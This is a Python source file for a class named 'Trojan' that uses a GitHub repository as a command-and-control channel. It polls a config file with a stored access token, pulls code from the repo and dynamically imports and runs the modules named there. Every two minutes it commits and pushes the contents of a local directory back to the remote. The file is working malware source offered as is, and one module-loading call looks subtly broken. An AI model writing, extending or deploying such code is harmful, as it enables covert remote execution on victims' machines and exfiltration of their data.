import os
import time
import requests
import base64
import importlib
import importlib.util
from git import Repo
from dotenv import load_dotenv

load_dotenv()


class Trojan:
    def __init__(self):
        self.local_dir = os.getenv("LOCAL_DIR")
        self.username = os.getenv("GIT_USER")
        self.access_token = os.getenv("PAT")
        self.repo = os.getenv("GIT_REPO")

    def run(self):
        while True:
            self.check("config/config.txt")
            self.push_git_repo()
            print("Done")
            time.sleep(120)

    def check(self, file_path):
        url = f"https://api.github.com/repos/{self.username}/{self.repo}/contents/{file_path}?ref=master"
        headers = {"Authorization": f"Bearer {self.access_token}"}
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            decoded_content = base64.b64decode(response.json()["content"]).decode("utf-8")
            words = decoded_content.split()
            if words:
                for word in words:
                    self.import_module(word.capitalize())

    def import_module(self, module_name):
        try:
            module = importlib.import_module(module_name)
        except ImportError:
            self.pull_git_repo()
            spec = importlib.util.spec_from_file_location(module_name)
            module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(module)
        self.run_module(module)

    def pull_git_repo(self):
        repo = Repo(self.local_dir)
        origin = repo.remote("origin")
        origin.fetch()
        origin.pull(repo.active_branch.name)

    def push_git_repo(self):
        repo = Repo(self.local_dir)
        repo.git.add(".")
        if repo.is_dirty() or repo.untracked_files:
            repo.git.commit("-m", "update trojan")
            origin = repo.remote("origin")
            origin.set_url(f"https://{self.username}:{self.access_token}@github.com/{self.username}/{self.repo}.git")
            origin.push()
        else:
            print("No changes to commit. Skipping push.")

    def run_module(self, module):
        module_class = getattr(module, module.__name__)
        instance = module_class()
        instance.install_requirements()
        instance.run()


def main():
    Trojan().run()


if __name__ == '__main__':
    main()
